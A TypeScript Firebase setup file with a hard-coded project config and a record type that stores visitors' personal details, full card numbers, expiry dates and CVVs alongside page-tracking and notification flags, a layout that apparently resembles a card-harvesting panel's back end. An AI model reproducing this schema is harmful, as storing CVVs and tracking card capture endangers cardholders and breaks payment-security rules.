import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDlZ8nSzmdG_HSmiga8rEcAZDoClQuYH6s",
  authDomain: "ertyw-9d2eb.firebaseapp.com",
  projectId: "ertyw-9d2eb",
  storageBucket: "ertyw-9d2eb.firebasestorage.app",
  messagingSenderId: "676204988788",
  appId: "1:676204988788:web:81ba12a4b9602bba9cc421",
  measurementId: "G-LDRBHXSV3X"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
